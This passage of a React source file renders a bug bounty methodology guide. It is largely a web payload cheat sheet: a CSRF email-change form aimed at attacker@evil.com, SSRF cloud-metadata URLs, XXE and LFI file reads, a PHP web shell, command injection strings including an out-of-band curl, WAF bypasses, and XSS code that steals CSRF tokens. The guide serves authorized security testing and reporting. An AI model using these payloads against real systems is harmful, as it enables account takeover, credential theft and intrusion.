              <ol className="list-decimal list-inside space-y-2 text-muted-foreground mb-4"><li>Perform action as User A, capture request</li><li>Switch session cookie to User B in Repeater</li><li>Replace object identifiers with User A&apos;s resources</li><li>Observe if User B can access/modify</li></ol>
              <p className="text-muted-foreground"><strong>GUID IDOR amplification:</strong> if a GUID is used, find an endpoint that <em>leaks</em> or <em>lists</em> those GUIDs. That leak + the IDOR forms a complete exploit chain and significantly improves severity.</p>
              {/* CSRF */}
              <h3 className="text-xl font-bold text-foreground mb-3 mt-6" id="csrf">CSRF</h3>
              <p className="text-muted-foreground mb-3">Focus only on <strong>authenticated, state-changing actions</strong>. Test: missing token, wrong token, removed token entirely, <code className="bg-muted px-1 rounded">SameSite</code> cookie attribute.</p>
              <CodeBlock>{'<html>\n  <body>\n    <form action="https://target.com/settings/email" method="POST">\n      <input type="hidden" name="email" value="attacker@evil.com" />\n      <input type="submit" value="Click me" />\n    </form>\n    <script>document.forms[0].submit();</script>\n  </body>\n</html>'}</CodeBlock>
              <p className="text-muted-foreground"><strong>Chain idea:</strong> CSRF \u2192 email change \u2192 password reset link sent to attacker = full account takeover.</p>
              {/* SSRF */}
              <h3 className="text-xl font-bold text-foreground mb-3 mt-6" id="ssrf">SSRF</h3>
              <p className="text-muted-foreground mb-3">Parameters: <code className="bg-muted px-1 rounded">url=</code>, <code className="bg-muted px-1 rounded">src=</code>, <code className="bg-muted px-1 rounded">dest=</code>, <code className="bg-muted px-1 rounded">feed=</code>, <code className="bg-muted px-1 rounded">webhook=</code>, <code className="bg-muted px-1 rounded">callback=</code>, <code className="bg-muted px-1 rounded">load=</code>, <code className="bg-muted px-1 rounded">proxy=</code>. Use Collaborator/interactsh to detect blind SSRF first.</p>
              <CodeBlock>{'http://127.0.0.1/\nhttp://169.254.169.254/latest/meta-data/                    (AWS)\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\nhttp://metadata.google.internal/computeMetadata/v1/         (GCP)\nhttp://169.254.169.254/metadata/instance?api-version=2021-02-01  (Azure)'}</CodeBlock>
              <h4 className="text-lg font-bold text-foreground mb-2">Filter Bypass</h4>
              <CodeBlock>{'http://[::1]/                    IPv6 localhost\nhttp://2130706433/               Decimal IP for 127.0.0.1\nhttp://0x7f000001/               Hex IP\nhttp://127.1/                    Short form\nhttp://127.0.0.1#@evil.com       Hash trick\nhttp://target.com@127.0.0.1      @ notation'}</CodeBlock>
              {/* XXE */}
              <h3 className="text-xl font-bold text-foreground mb-3 mt-6" id="xxe">XXE</h3>
              <p className="text-muted-foreground mb-3">Test everywhere XML is consumed — including document uploads.</p>
              <CodeBlock>{'<?xml version="1.0"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<root>&xxe;</root>'}</CodeBlock>
              <h4 className="text-lg font-bold text-foreground mb-2">SVG Upload XXE</h4>
              <CodeBlock>{'<?xml version="1.0" standalone="yes"?>\n<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<svg xmlns="http://www.w3.org/2000/svg">\n  <text>&xxe;</text>\n</svg>'}</CodeBlock>
              <h4 className="text-lg font-bold text-foreground mb-2">Blind XXE (Out-of-Band)</h4>
              <CodeBlock>{'<?xml version="1.0"?>\n<!DOCTYPE root [\n  <!ENTITY % xxe SYSTEM "http://your-collaborator.com/malicious.dtd">\n  %xxe;\n]>\n<root/>'}</CodeBlock>
              {/* LFI */}
              <h3 className="text-xl font-bold text-foreground mb-3 mt-6" id="lfi">LFI / RFI</h3>
              <p className="text-muted-foreground mb-3">Parameters: <code className="bg-muted px-1 rounded">file=</code>, <code className="bg-muted px-1 rounded">page=</code>, <code className="bg-muted px-1 rounded">template=</code>, <code className="bg-muted px-1 rounded">path=</code>, <code className="bg-muted px-1 rounded">include=</code>, <code className="bg-muted px-1 rounded">module=</code></p>
              <CodeBlock>{'# Linux\n../../../../etc/passwd\n../../../../etc/shadow\n../../../../proc/self/environ\n../../../../var/log/apache2/access.log\n\n# Windows\n..\\..\\..\\windows\\win.ini\n..\\..\\..\\windows\\system32\\drivers\\etc\\hosts\n\n# PHP wrappers\nphp://filter/convert.base64-encode/resource=/etc/passwd\nphp://filter/read=string.rot13/resource=/etc/passwd\nphp://input\n\n# Null byte (old PHP)\n../../../../etc/passwd%00'}</CodeBlock>
              {/* File Upload */}
              <h3 className="text-xl font-bold text-foreground mb-3 mt-6" id="upload">File Upload</h3>
              <p className="text-muted-foreground mb-3"><strong>Extension bypass order of operations:</strong></p>
              <ol className="list-decimal list-inside space-y-2 text-muted-foreground mb-4">
                <li>Upload <code className="bg-muted px-1 rounded">.php</code> — blocked? Try <code className="bg-muted px-1 rounded">.php5</code>, <code className="bg-muted px-1 rounded">.phtml</code>, <code className="bg-muted px-1 rounded">.phar</code>, <code className="bg-muted px-1 rounded">.shtml</code></li>
                <li>Change <code className="bg-muted px-1 rounded">Content-Type</code> to <code className="bg-muted px-1 rounded">image/jpeg</code> while keeping dangerous extension</li>
                <li>Double extension: <code className="bg-muted px-1 rounded">shell.php.jpg</code>, <code className="bg-muted px-1 rounded">shell.jpg.php</code></li>
                <li>Null byte: <code className="bg-muted px-1 rounded">shell.php%00.jpg</code></li>
                <li>Upload SVG with XSS or XXE payload</li>
                <li>Upload DOCX/XLSX with XXE payload</li>
              </ol>
              <CodeBlock>{'<?php system($_GET[\'cmd\']); ?>'}</CodeBlock>
              {/* Command Injection */}
              <h3 className="text-xl font-bold text-foreground mb-3 mt-6" id="cmdi">Command Injection</h3>
              <p className="text-muted-foreground mb-3">Target: hostname, IP, domain, filename, shell options, email address parameters.</p>
              <CodeBlock>{'; id\n| id\n|| id\n&& id\n`id`\n$(id)\n%0Aid\n; sleep 5          (blind timing)\n; curl https://your-collaborator.com/$(whoami)  (blind OOB)'}</CodeBlock>
              <h4 className="text-lg font-bold text-foreground mb-2">Windows Variants</h4>
              <CodeBlock>{'& whoami\n| whoami\n&& whoami\n; whoami\n%26 whoami'}</CodeBlock>
              {/* Open Redirects */}
              <h3 className="text-xl font-bold text-foreground mb-3 mt-6" id="redirect">Open Redirects</h3>
              <p className="text-muted-foreground mb-3">Parameters: <code className="bg-muted px-1 rounded">redirect=</code>, <code className="bg-muted px-1 rounded">url=</code>, <code className="bg-muted px-1 rounded">next=</code>, <code className="bg-muted px-1 rounded">returnTo=</code>, <code className="bg-muted px-1 rounded">goto=</code>, <code className="bg-muted px-1 rounded">destination=</code></p>
              <CodeBlock>{'redirect=https://evil.com\nredirect=//evil.com\nredirect=javascript:alert(1)\nhttps://target.com@evil.com\nhttps://target.com.evil.com\nhttps://evil.com%23target.com\n//evil.com/%2F..'}</CodeBlock>
              <p className="text-muted-foreground">Open redirects are low severity alone. Demonstrate a realistic chain (OAuth code theft, phishing) to elevate severity.</p>
              {/* Auth & Session */}
              <h3 className="text-xl font-bold text-foreground mb-3 mt-6" id="auth">Authentication & Session</h3>
              <h4 className="text-lg font-bold text-foreground mb-2">Username Enumeration</h4>
              <p className="text-muted-foreground mb-3">Compare responses for valid vs. invalid usernames (timing, message, status code). Test registration: &ldquo;email already in use&rdquo; confirms account existence.</p>
              <h4 className="text-lg font-bold text-foreground mb-2">Password Reset</h4>
              <ul className="space-y-2 text-muted-foreground mb-4">
                 <li>Add a second <code className="bg-muted px-1 rounded">email</code> parameter: <code className="bg-muted px-1 rounded">email=victim@target.com&email=attacker@evil.com</code></li>
                <li>Check if reset tokens appear in URL (they leak via Referer headers)</li>
                <li>Test token reuse and weak/predictable tokens</li>
              </ul>
              <h4 className="text-lg font-bold text-foreground mb-2">JWT Testing</h4>
              <CodeBlock>{'# alg:none attack \u2014 remove signature entirely\n# Algorithm confusion \u2014 RS256 key used as HS256 secret\n# Weak secret bruteforce\nhashcat -a 0 -m 16500 <jwt> /usr/share/wordlists/rockyou.txt'}</CodeBlock>
              <h4 className="text-lg font-bold text-foreground mb-2">Session Management</h4>
              <ul className="space-y-2 text-muted-foreground mb-4">
                <li>Does the session token change after login? (session fixation if not)</li>
                <li>Does logout invalidate the token server-side?</li>
                <li>Does the token remain valid after password change?</li>
              </ul>
              <h4 className="text-lg font-bold text-foreground mb-2">Cookie Flags</h4>
              <Table headers={["Flag","If Missing"]} rows={[["HttpOnly","XSS can steal the cookie"],["Secure","Cookie sent over HTTP"],["SameSite=Strict/Lax","CSRF risk increases"],["Correct Domain scope","Subdomain can read cookie"]]} />
              {/* Business Logic */}
              <h3 className="text-xl font-bold text-foreground mb-3 mt-6" id="logic">Business Logic</h3>
              <p className="text-muted-foreground mb-3">This is where the unloved bugs live and duplicate rates are lowest.</p>
              <ul className="space-y-2 text-muted-foreground mb-6">
                <li>• <strong>Race conditions:</strong> two requests for same limited resource simultaneously — coupon codes, referral bonuses, stock purchase</li>
                <li>• <strong>Negative values:</strong> enter -1 quantity in cart, transfer -100</li>
                <li>• <strong>Workflow bypass:</strong> skip required steps (skip payment, skip verification)</li>
                <li>• <strong>State manipulation:</strong> send request valid in state A while in state B</li>
                <li>• <strong>Limit bypass:</strong> send 6 items when limit is 5 by replaying or modifying a request</li>
                <li>• <strong>Privilege gates:</strong> does the price come from the client? Does the role come from the client?</li>
              </ul>
              {/* Modern Attack Surface */}
              <h3 className="text-xl font-bold text-foreground mb-3 mt-6" id="modern">Modern Attack Surface (2026)</h3>
              <h4 className="text-lg font-bold text-foreground mb-2">GraphQL</h4>
              <CodeBlock>{'{"query": "{__schema{types{name}}}"}\npython3 graphql-map.py --url https://target.com/graphql'}</CodeBlock>
              <ul className="space-y-2 text-muted-foreground mb-4">
                <li>• IDOR via object IDs in query args</li>
                <li>• Missing auth checks on mutations</li>
                <li>• Batching attacks (rate limit bypass via many queries in one request)</li>
                <li>• Introspection in production (information disclosure)</li>
              </ul>
              <h4 className="text-lg font-bold text-foreground mb-2">WebSockets</h4>
              <ul className="space-y-2 text-muted-foreground mb-4">
                <li>Intercept WebSocket messages in Burp</li>
                <li>Test message tampering — is server-side validation as strict as HTTP?</li>
                <li>Test cross-site WebSocket hijacking (CSWSH)</li>
              </ul>
              <h4 className="text-lg font-bold text-foreground mb-2">OAuth 2.0 / OIDC</h4>
              <ul className="space-y-2 text-muted-foreground mb-4">
                <li>Test for <code className="bg-muted px-1 rounded">state</code> parameter absence or reuse \u2192 CSRF on OAuth flow</li>
                <li>Test <code className="bg-muted px-1 rounded">redirect_uri</code> validation</li>
                <li>Test code reuse and PKCE implementation</li>
              </ul>
              <h4 className="text-lg font-bold text-foreground mb-2">API Keys & JWT in JS Files</h4>
              <CodeBlock>{'trufflehog filesystem /path/to/js/files\ngrep -rE "(api_key|apikey|secret|token|password|Authorization)" *.js'}</CodeBlock>
              <h4 className="text-lg font-bold text-foreground mb-2">Prototype Pollution</h4>
              <CodeBlock>{'?__proto__[admin]=true\n?constructor[prototype][admin]=true'}</CodeBlock>
              <h4 className="text-lg font-bold text-foreground mb-2">Cache Poisoning</h4>
              <p className="text-muted-foreground mb-3">Test unkeyed headers: <code className="bg-muted px-1 rounded">X-Forwarded-Host</code>, <code className="bg-muted px-1 rounded">X-Forwarded-Port</code>, <code className="bg-muted px-1 rounded">X-Host</code>. If reflected or influence caching, you may poison the cache for all users.</p>
              <h4 className="text-lg font-bold text-foreground mb-2">Subdomain Takeover</h4>
              <CodeBlock>{'subzy run --targets subdomains.txt\nnuclei -l subdomains.txt -t nuclei-templates/dns/'}</CodeBlock>
            </Section>

            {/* 8. WAF Bypass */}
            <Section id="waf" icon={Shield} color="bg-orange-500/10 text-orange-500" title="8. WAF Bypass Techniques" expanded={expanded.has("waf")} onToggle={() => toggle("waf")}>
              <CodeBlock>{'# Base64 data URI\ndata:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\n\n# Space substitution\n<Img/src=x/onerror=alert(1)>\n<svg%09onload=alert(1)>   (%09 = tab)\n\n# Comment injection (SQL)\nSE/**/LECT\nUN/**/ION\n\n# Case variation\nSeLeCt 1,2,3\n\n# URL encoding (single and double)\n%3Cscript%3E\n%253Cscript%253E\n\n# Newlines in JS URI\nj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At:alert(1)\n\n# Wildcard in file paths\n/etc/pa*wd\ncat\\${IFS}/etc/passwd\n\n# Custom HTML tags\n<CUSTOM id=x onfocus=alert(1) tabindex=1>#x\n\n# Barracuda specific\n<body style="height:1000px" onwheel="alert(1)">\n<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">'}</CodeBlock>
              <p className="text-muted-foreground mt-4">Full WAF bypass collection: <a href="https://github.com/0xInfection/Awesome-WAF" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">Awesome-WAF</a></p>
            </Section>

            {/* 9. Chaining */}
            <Section id="chain" icon={LinkIcon} color="bg-pink-500/10 text-pink-500" title="9. Chaining Vulnerabilities" expanded={expanded.has("chain")} onToggle={() => toggle("chain")}>
              <p className="text-muted-foreground mb-6">Solo low-severity bugs become high-severity chains. Always ask: <em>can I combine this with something else?</em></p>
              <div className="space-y-4">
                {[ ["XSS \u2192 Account Takeover","Find stored XSS in admin-visible field \u2192 steal non-HttpOnly session cookie"],["XSS \u2192 CSRF Bypass","Stored XSS bypasses CSRF tokens \u2014 JS reads token from DOM"],["CSRF \u2192 Stored XSS \u2192 Worm","CSRF tricks victim into posting stored XSS; XSS replicates via CSRF to every viewer"],["IDOR + Info Leak \u2192 Full Enumeration","Find GUID leak endpoint + IDOR = access all users' data"],["Open Redirect \u2192 OAuth Code Theft","OAuth redirect_uri accepts open redirect \u2192 steal auth code"],["SSRF \u2192 Cloud Metadata \u2192 RCE","SSRF \u2192 access AWS metadata \u2192 leaked credentials"],["Password Reset + CSRF \u2192 Account Takeover","CSRF change email first \u2192 reset link goes to attacker"] ].map(([t,d],i) => (
                  <div key={i} className="rounded-lg border border-border bg-card/50 p-4"><p className="font-semibold text-foreground">{t}</p><p className="text-sm text-muted-foreground mt-1">{d}</p></div>
                ))}
              </div>
              <h3 className="text-xl font-bold text-foreground mb-3 mt-6">XSS \u2192 CSRF Bypass Code Example</h3>
              <CodeBlock>{'fetch(\'/settings\').then(r => r.text()).then(html => {\n  const token = html.match(/csrf_token" value="([^"]+)"/)[1];\n  fetch(\'/settings/email\', {\n    method: \'POST\',\n    body: `email=attacker@evil.com&csrf_token=${token}`\n  });\n});'}</CodeBlock>
            </Section>

            {/* 10. Reporting */}
            <Section id="reporting" icon={FileText} color="bg-indigo-500/10 text-indigo-500" title="10. Reporting" expanded={expanded.has("reporting")} onToggle={() => toggle("reporting")}>
              <p className="text-muted-foreground mb-4">A great bug reported badly gets marked as informational. A clear, well-structured report earns you the payout and the reputation.</p>
              <div className="rounded-lg border border-border bg-card/50 p-6 mb-6">
                <h3 className="font-bold text-foreground mb-3">Report Template</h3>
                <CodeBlock>{'Title: [Severity] Short, specific description\ne.g. [High] Stored XSS in user display name allows session cookie theft\n\nSeverity: Critical / High / Medium / Low / Informational\nCVSS: (if the program uses it)\n\nSummary:\nA 2-3 sentence description of the vulnerability, affected component, and impact.\n\nSteps to Reproduce:\n1. Log in as User A\n2. Navigate to Settings \u2192 Profile\n3. Set display name to: <img src=x onerror=alert(document.domain)>\n4. Save\n5. Log in as User B, navigate to admin user list\n6. The payload fires in the admin context \u2014 XSS executes as admin\n\nImpact:\nExplain what an attacker can concretely achieve. Reference data, accounts, or systems at risk. Mention GDPR implications if PII is accessible (EU programs).\n\nPoC:\nScreenshot or screen recording confirming the finding.\n\nRemediation (optional but welcomed):\nShort suggestion: encode user-supplied data before rendering in HTML.'}</CodeBlock>
              </div>
              <h3 className="text-xl font-bold text-foreground mb-3">Severity Calibration Tips</h3>
              <ul className="space-y-2 text-muted-foreground"><li>• <strong>No impact = no finding.</strong> If you can&apos;t articulate what an attacker gains, do more work before submitting.</li><li>• <strong>Escalate with chains.</strong> Open redirect is low. + OAuth code theft is high.</li><li>• <strong>GDPR is a severity multiplier</strong> on EU targets. Accessing PII is a violation beyond the technical bug.</li><li>• <strong>Admin-only XSS</strong> is still valid — demonstrate what an attacker can do once they have admin XSS.</li><li>• <strong>Self-XSS</strong> is out of scope unless you show a realistic delivery vector.</li></ul>
            </Section>

            {/* 11. Tools Reference */}
            <Section id="tools" icon={Wrench} color="bg-teal-500/10 text-teal-500" title="11. Tools Reference" expanded={expanded.has("tools")} onToggle={() => toggle("tools")}>
              <h3 className="text-xl font-bold text-foreground mb-3">Proxy & Interception</h3>
              <Table headers={["Tool","Use"]} rows={[["Burp Suite Pro","Core proxy, scanner, Collaborator"],["OWASP ZAP","Free alternative; automated scanning"]]} />
              <h3 className="text-xl font-bold text-foreground mb-3 mt-6">Recon</h3>
              <Table headers={["Tool","Use"]} rows={[["subfinder","Passive subdomain enumeration"],["amass","In-depth subdomain enumeration"],["httprobe","Check which subdomains are live"],["aquatone / EyeWitness","Subdomain screenshot flyover"],["gau / waybackurls","Historical URL discovery"],["linkfinder","Extract endpoints from JS files"],["naabu","Fast port scanner"],["nmap","Detailed port/service scanner"],["shodan","Passive internet-wide scanning"],["crt.sh","Certificate transparency lookup"]]} />
              <h3 className="text-xl font-bold text-foreground mb-3 mt-6">Fuzzing & Scanning</h3>
              <Table headers={["Tool","Use"]} rows={[["gobuster / ffuf / feroxbuster","Directory & content brute-forcing"],["sqlmap","SQL injection automation"],["nuclei","Template-based vulnerability scanning"],["nikto","Web server misconfiguration scanner"],["dalfox","XSS automation and parameter fuzzing"],["tplmap","SSTI exploitation"],["subzy","Subdomain takeover detection"]]} />
              <h3 className="text-xl font-bold text-foreground mb-3 mt-6">Reporting & Tracking</h3>
              <Table headers={["Tool","Use"]} rows={[["XSS Hunter","Blind XSS callback receiver with screenshots"],["Burp Collaborator","Out-of-band detection (SSRF, blind SQLi, XXE)"],["interactsh","Open-source Collaborator alternative"],["Caido","Modern Burp alternative (rising in 2026)"]]} />
              <h3 className="text-xl font-bold text-foreground mb-3 mt-6">Custom Scripts (this workspace)</h3>
              <Table headers={["Script","Purpose"]} rows={[["AutoSubdomainContentDiscXSSDalfox.py","Subdomain enum \u2192 content discovery \u2192 XSS scanning"],["BugBountyAutomator.py","Full-pipeline bug bounty automation"],["BACProxy.py","Broken access control proxy testing"],["autoScan.sh","Initial automated scan wrapper"],["initialScan.sh","First-pass target scan"],["webapp_pentest.py","Web app pentest helper"]]} />
              <h3 className="text-xl font-bold text-foreground mb-3 mt-6">Wordlists</h3>
              <ul className="space-y-2 text-muted-foreground mb-6">
                <li>• <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">SecLists</a> — install separately: <code className="bg-muted px-1 rounded">git clone https://github.com/danielmiessler/SecLists</code></li>
                <li>• <code className="bg-muted px-1 rounded">dir23.txt</code> — directory brute-forcing</li>
                <li>• <code className="bg-muted px-1 rounded">dirlist.txt</code> — directory brute-forcing</li>
              </ul>
              <h3 className="text-xl font-bold text-foreground mb-3">Quick Reference Card</h3>
              <div className="rounded-lg border border-border bg-zinc-950 p-6 font-mono text-sm text-zinc-100 whitespace-pre-wrap">{'PHASE 1 \u2014 RECON\n  subfinder + assetfinder + amass \u2192 subdomains\n  httprobe \u2192 alive hosts\n  gau + waybackurls \u2192 historical URLs\n  linkfinder \u2192 JS endpoints\n  nuclei \u2192 automated scanning\n  Google + GitHub dorking\n  Shodan passive sources\n\nPHASE 2 \u2014 EXPLORE\n  Register all roles\n  Inject XSS + SSTI payload into every field from the start\n  Read docs, API docs, Swagger\n  Map all features and integration points\n  Flag interesting parameters by type\n  Create a mindmap\n\nPHASE 3 \u2014 BURP DEEP DIVE\n  Filter to parameterised requests\n  Repeater each interesting endpoint\n  Infer API versions (v2 \u2192 v1)\n  Test HTTP method tampering\n  Hunt for mass assignment (add role/admin params)\n  Intruder/ffuf for IDs, fuzzing, rate-limit tests\n\nPHASE 4 \u2014 TEST\n  XSS \u2192 SSTI \u2192 SQLi \u2192 IDOR \u2192 CSRF \u2192 SSRF \u2192 XXE \u2192 LFI\n  File Upload \u2192 Command Injection \u2192 Open Redirect\n  Auth & session checks\n  Business logic (race conditions, negative values, workflow bypass)\n  Modern surface: GraphQL, WebSockets, OAuth, prototype pollution\n\nCHAIN \u2192 REPORT\n  Combine low bugs into high chains\n  PoC first \u2014 no PoC, no report\n  Prove impact explicitly\n  GDPR multiplier on EU targets\n  Well-written report = higher payout'}</div>
            </Section>

            {/* Footer CTA */}
            <section className="border-t border-border py-16 text-center">
              <Flame className="mx-auto h-8 w-8 text-primary mb-4" />
              <h2 className="text-2xl font-bold text-foreground">Spend 70% testing, 30% learning. Balance these two and you will see results.</h2>
              <p className="mt-2 text-muted-foreground">The only difference between a beginner and an expert is the number of bugs they&apos;ve found.</p>
              <div className="mt-8 flex flex-wrap items-center justify-center gap-3">
                <Link href="/payloads" className="inline-flex items-center gap-2 rounded-xl border border-border bg-card px-5 py-2.5 text-sm font-medium text-foreground hover:border-primary/30 transition-all">Browse Payloads <Code className="h-4 w-4" /></Link>
                <Link href="/tools" className="inline-flex items-center gap-2 rounded-xl border border-border bg-card px-5 py-2.5 text-sm font-medium text-foreground hover:border-primary/30 transition-all">Explore Tools <Zap className="h-4 w-4" /></Link>
              </div>
              <p className="mt-6 text-xs text-muted-foreground/50">Last updated: May 2026. Built on practical experience. Expand this guide with every new finding.</p>
            </section>
          </div>
        </div>
      </main>

      {/* Floating Expand/Collapse All Button - removed per user request */}
    </div>
  )
}